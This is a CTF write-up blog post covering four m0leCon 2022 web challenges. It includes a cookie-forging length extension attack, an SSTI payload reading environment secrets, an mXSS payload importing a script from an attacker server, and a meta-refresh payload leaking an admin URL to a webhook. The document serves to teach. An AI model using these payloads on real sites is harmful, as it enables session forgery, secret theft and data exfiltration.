---
title: m0leCon CTF 2022 Notes
catalog: true
date: 2022-05-21 16:14:14
tags: [Security]
categories: [Security]
photos: /img/m0lecon-ctf-2022-writeup/cover-en.png
---

<img src="/img/m0lecon-ctf-2022-writeup/cover.png" style="display:none;">

I originally planned to write a more detailed post, but I realized that it might take a long time to publish. So I decided to write a brief version first.

I solved the following four web challenges:

1. Fancy Notes
2. Dumb Forum
3. LESN
4. ptMD

Here are some keywords that might be helpful for future reference:

1. Length extension attack
2. SSTI
3. Mutation XSS `<svg><style>`
4. `<meta name="referrer" content="unsafe-url" />`
5. `<meta http-equiv="refresh" content="3;url">`
6. Puppeteer's click behavior is to capture the element position and then click the coordinates.

<!-- more -->

## Fancy Notes

The core code of this challenge is as follows:

```  py
def get_user():
    if not 'user' in request.cookies:
        return None

    cookie = base64.b64decode(request.cookies.get(
        'user')).decode('raw_unicode_escape')
    assert len(cookie.split('|')) == 2
    user_string = cookie.split('|')[0]
    signature_string = cookie.split('|')[1]

    if hashlib.sha256((SECRET_KEY + user_string).encode('raw_unicode_escape')).hexdigest() != signature_string:
        print("nope")
        return None

    user = serialize_user(user_string)
    return user
```

The code below is used to serialize and deserialize the user information based on the cookie:

``` py
def serialize_user(user_string):
    user = dict()
    for kv in user_string.split(','):
        k = kv.split('=')[0]
        v = kv.split('=')[1]
        user[k] = v
    return user

def deserialize_user(user):
    values = []
    for k in ["username", "locale"]:
        values.append(f'{k}={user.__dict__[k]}')
    return ','.join(values)
```

The code below is used to generate the cookie:

``` py
def generate_cookie(user):
    user_string = deserialize_user(user)
    signature_string = hashlib.sha256(
        (SECRET_KEY + user_string).encode('raw_unicode_escape')).hexdigest()
    cookie = base64.b64encode(
        (f'{user_string}|{signature_string}').encode('raw_unicode_escape')).decode()
    return cookie
```

The goal is to forge a cookie to log in as an admin and obtain the flag.

Under normal circumstances, assuming our user is named "abc" and the locale is "en", the generated `user_string` will be: `username=abc,locale=en`.

From `serialize_user`, we can see that the earlier attributes will be overwritten by the later ones. Therefore, if our `user_string` is `username=a,locale=en,username=admin`, when it is restored to a user, the identity will become admin.

When generating the cookie, a signature (`sha256(secret + user_string)`) is added to verify the data integrity.

Therefore, in the absence of knowledge of the key, we should not be able to forge the `user_string` because the integrity check will fail.

However, this challenge uses a verification method that can be attacked using a technique called length extension attack.

Simply put, if there is an operation: `M1 = hash(secret + data)`, you only need to know the "length" of `secret+data`, without knowing what the content is, and the resulting `M1`. Then, you can append any string after `secret+data`, and know the valid `hash(secret + data + padding + any data)`.

For example, if you know that `"{secret}username=a"` will become `781e5e245d69b566979b86e28d23f2c7` after being hashed by md5, even if you do not know the secret, you can still know the md5 of `"{secret}username=a{padding},username=admin"`.

The `{padding}` above is related to the principle of hash algorithm.

In short, through this attack method, we can extend the known string and generate a valid hash value without knowing the secret, and bypass the check of this challenge.

As for the detailed principles and attack methods, I will leave a few reference articles here, and I may come back to fill this gap in the future:

1. [Everything you need to know about hash length extension attacks](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks)
2. [Length Extension Attack (LEA)](https://maojui.me/Crypto/LEA/)
3. [Hash Length Extension Attacks](https://www.whitehatsec.com/blog/hash-length-extension-attacks/)
4. [Understanding the length extension attack](https://crypto.stackexchange.com/questions/3978/understanding-the-length-extension-attack)
5. [Merkle–Damgård structure and length extension attack](http://www.flydean.com/md-length-extension/)
6. [Hash Length Extension Attacks](https://xz.aliyun.com/t/2563)
7. [Length extension attack](https://ucgjhe.github.io/post/length_extension_attack/)

## Dumb Forum

There is an SSTI in this question:

``` py
@app.route('/profile', methods=['GET', 'POST'])
@login_required
def profile():
    with open('app/templates/profile.html') as p:
        profile_html = p.read()
    
    profile_html = profile_html % (current_user.username, current_user.email, current_user.about_me)

    if(current_user.about_me == None):
        current_user.about_me = ""
    return render_template_string(profile_html)
```

Both the username and aboutme are checked and cannot use `}{`, while email is only checked if it is a valid email address, and if so, it can be used.

Therefore, `abc｛{7*7}}@abc.com` will be displayed as `abc49@abc.com` on the interface because in this library, if an email address has `()` it will be considered invalid, so `()` cannot be used.

The flag is in the environment variable, so just do this to win:

``` py
{{cycler.__init__.__globals__.os.environ}}@x.com
```

## LESN

In this question, you can create a post, the content of which can be controlled but will be sanitized, and finally rendered like this:

``` ejs
<script src="/static/script.js" async></script>

<a style="position: absolute; left: 30%; top:5px" href="/">Home</a>
<a style="position: absolute; right: 30%; top:5px" href="/edit/<%= imgid %>">Edit</a>

<div style="margin-top: 3em;">
    <img src="<%= imgurl %>" onerror="setTimeout(redirect_error_image,1500)"
        style="max-height: 300px; max-width: 300px; display:block; margin: auto; border: 2px solid #555;">

    <div style="margin-top: 30px; text-align: center;"><%- description %></div>
</div>


<%- include('footer') %>
```

The filtering code looks like this:

``` js
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

function my_sanitize(html) {
    const document = new JSDOM('').window.document
    document.body.outerHTML = html

    let node;
    const iter = document.createNodeIterator(document.body)

    while (node = iter.nextNode()) {
        if (/(script|iframe|frame|object|data|m.+)/i.test(node.nodeName)) {
            node.parentNode.removeChild(node)
            continue
        }


        if (node.attributes) {
            for (let i = node.attributes.length - 1; i >= 0; i--) {
                const att = node.attributes[i]
                if (! /(class|src|style)/i.test(att.name)) {
                    node.removeAttributeNode(att)
                }
            }
        }
    }

    return document.body.innerHTML
}

function sanitize(html) {

    let clean = my_sanitize(html)

    clean = DOMPurify.sanitize(clean)

    return clean
}


module.exports = { sanitize }
```

Finally, it has been passed through DOMPurify, so dangerous tags cannot be used.

The key point of this question is that when I was looking at it, I found that sometimes the console would display an error message of `redirect_error_image is undefined`.

This is because the script is loaded using async, so there is a race condition problem. If the `onerror` of the img is triggered before the script is loaded, then `redirect_error_image` will be undefined.

Using this feature, the winning formula is to use DOM clobbering to control `redirect_error_image`, and then use the `setTimeout` function to execute arbitrary code with the first parameter passed as a string, which is similar to the `eval` function.

The part of DOM clobbering needs to bypass the custom parser first, which is completed by a teammate. The principle is roughly described in this article: [HTML sanitization bypass in Ruby Sanitize < 5.2.1](https://research.securitum.com/html-sanitization-bypass-in-ruby-sanitize-5-2-1/), using namespace confusion to create mXSS, and the payload looks like this:

``` html
<svg><style><&sol;style><&sol;svg>&lt;a id=redirect_error_image href=http:pew>g
```

jsdom will parse the above paragraph into this:

```
BODY
-> svg
---> style
------> #text: </style></svg><a id=redirect_error_image href=http:pew>g
```

It is just a style with content, nothing special, but when restored to `document.body.innerHTML`, it becomes like this:

``` html
<svg><style></style></svg><a id=redirect_error_image href=http:pew>g</style></svg>
```

Then this `<a>` tag is generated, allowing us to perform DOM clobbering. The content can be simply put `http:import(script)`, where `http:` is treated as a label, and the following code will be executed directly.

The next step is how to make `onerror` happen faster than the script is loaded. According to the author's [writeup](https://github.com/xatophi/m0leconteaser2022-LESN/blob/main/writeup.md), you can put a URL like `http://localhost` in the image URL to make it fail quickly, and `http://not_exist` should work too.

Then you can use an iframe to load your post and then send the custom page to the bot to avoid using the cached `script.js`.

At that time, I thought that the browser had priority when loading resources. If I could create a combination with a higher priority than `script.js`, I could delay the loading of the script. So I tried to add a lot of pictures to the page:

``` html
<svg><style><&sol;style><&sol;svg>&lt;a id=redirect_error_image href=mailto:import('//vps/exploit.js')>
&lt;img src=https://deelay.me/20000/https://example.com>
&lt;img src=https://deelay.me/20001/https://example.com>
&lt;img src=https://deelay.me/20002/https://example.com>
&lt;img src=https://deelay.me/20003/https://example.com>
```

But it seems to be useless, and the order of the pictures should not be higher than the script. At that time, I did not continue to study what could achieve the ideal situation I wanted.

Finally, I thought of when @lbrnli1234 was solving an XSS question I gave before, he also encountered a race condition and then added a lot of iframes to increase the success rate. See: [Notes XSS Challenge Author Writeup](https://blog.huli.tw/2022/04/13/en/notes-challenge-author-writeup/)

I did the same thing and stuffed a bunch of iframes:

``` html
<!DOCTYPE html>
<html>
<head>
</head>
<body>

  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
</body>

</html>
```

Finally, I solved it. First blood.

## ptMD

This was the hardest challenge, but it was solved by everyone.

First, here's the author's writeup: https://github.com/xatophi/m0leconteaser2022-ptMD/blob/main/writeup.md

In short, you have a page where you can insert any HTML, but the CSP is `script-src 'self'`, so you can't XSS. The goal is to steal the contents of the admin note. Since the URL is unique and there is no permission management, stealing the URL is enough. On the client's page, there is a `last` button that takes you to the latest note page.

Since this was done using React, setting the URL to `/last` directly doesn't work because the notes are empty when first loaded, so it doesn't redirect to the latest note.

This is what the admin bot looks like:

``` js
async function visit(url) {
    const browser = await puppeteer.launch({
        headless: true,
        args: [
            '--disable-default-apps',
            '--disable-extensions',
            '--disable-gpu',
            '--disable-sync',
            '--disable-translate',
            '--hide-scrollbars',
            '--metrics-recording-only',
            '--mute-audio',
            '--no-first-run',
            '--no-sandbox',
            '--safebrowsing-disable-auto-update'
        ],
        executablePath: '/usr/bin/chromium'
    })


    try {
        let page = await browser.newPage()

        //login
        await page.goto(LOGIN_URL)

        await page.waitForSelector('#username')
        await page.focus('#username')
        await page.keyboard.type('admin', { delay: 10 })
        await page.focus('#password')
        await page.keyboard.type(ADMIN_PASSWORD, { delay: 10 })

        await new Promise(resolve => setTimeout(resolve, 300))
        await page.click('#submit')
        await new Promise(resolve => setTimeout(resolve, 300))

        //await page.waitForNavigation({ waitUntil: 'networkidle2' })
        console.log(await page.cookies())

        // visit URL after auth
        await page.goto(url, { timeout: 5000 })
        await new Promise(resolve => setTimeout(resolve, 2000))

        // logout
        await page.click('#logout')
        await new Promise(resolve => setTimeout(resolve, 2000))

        // close browser
        await page.close()
        await browser.close()
    } catch (e) {
        console.log(e)
        await browser.close()
        //throw (e)
    }

}
```

The last step was strange to me when I was looking at it, which was clicking the logout button. I was wondering why I had to click that, but I found out later that it was also one of the keys.

When I was solving it, I thought it might be related to the referrer policy, but using `<iframe referrerPolicy="unsafe-url"></iframe>` didn't seem to work.

The answer is indeed related to this, but it's like this:

``` html
<meta name="referrer" content="unsafe-url" />
<meta http-equiv="refresh" content="3;url=https://webhook.site/d485f13a-fd8b-4cfd-ad13-63d9b0f1f5ef" />
```

Use `<meta>` to set the referrer, and then use `meta refresh` to redirect the page after three seconds. Then, use CSS to hide the logout button behind the `last` button, so the admin bot will actually click the `last` button, jump to the note page, and then leak the URL based on the referrer policy.

Finally, this answer broke three things I thought I knew:

1. I thought meta had to be in the head to be effective.
2. I thought the meta tag would be ineffective after being cleared.
3. I thought that when puppeteer clicks a button, it is not related to the screen, but directly clicks the element.

For these three things, we can do a little experiment.

For the first point, I made a simple webpage:

``` html
<!DOCTYPE html>
<html>

<head>
  <meta charset='utf-8'>
</head>
<body>
  <h1>test</h1>
  <meta name="referrer" content="unsafe-url" />
  <meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; img-src https://*; child-src 'none';">
  <meta http-equiv="refresh" content="3;url=http://example.org" />    

</body>

<body>
```

An error is seen in the console:

> The Content Security Policy 'default-src 'self'; img-src https://*; child-src 'none';' was delivered via a <meta> element outside the document's <head>, which is disallowed. The policy has been ignored.

However, after three seconds, it does redirect. So only the CSP header must be in the head, and the others can be in the body.

For the second point, just modify the webpage:

``` html
<!DOCTYPE html>
<html>

<head>
  <meta charset='utf-8'>
</head>
<body>
  <h1>test</h1>
  <meta name="referrer" content="unsafe-url" />
  <meta http-equiv="refresh" content="3;url=http://example.org" />    
  <script>
    [...document.querySelectorAll('meta')].forEach(item => item.remove())
    alert(document.body.innerHTML)
  </script>
</body>

<body>
```

Although the meta tag is indeed removed, it still redirects after 3 seconds, so the effect is still there. It's really that magical.

For the third point, the document states [page
.click
(selector[, options])](https://pptr.dev/#?product=Puppeteer&version=v14.1.0&show=api-pageclickselector-options)

> This method fetches an element with selector, scrolls it into view if needed, and then uses page.mouse to click in the center of the element. If there's no element matching selector, the method throws an error.

If you look at the source code, you can see: [src/common/JSHandle.ts](https://github.com/puppeteer/puppeteer/blob/84fc4227a4543724ba3841f35183f0081751f9a8/src/common/JSHandle.ts#L696)

``` js
/**
 * This method scrolls element into view if needed, and then
 * uses {@link Page.mouse} to click in the center of the element.
 * If the element is detached from DOM, the method throws an error.
 */
async click(options: ClickOptions = {}): Promise<void> {
  await this._scrollIntoViewIfNeeded();
  const { x, y } = await this.clickablePoint(options.offset);
  await this._page.mouse.click(x, y, options);
}
```

Here, we are simply using `_page.mouse.click` to click on a specified coordinate. Therefore, if there is an element covering it, it will click on the element that is on top.

I have learned a lot.
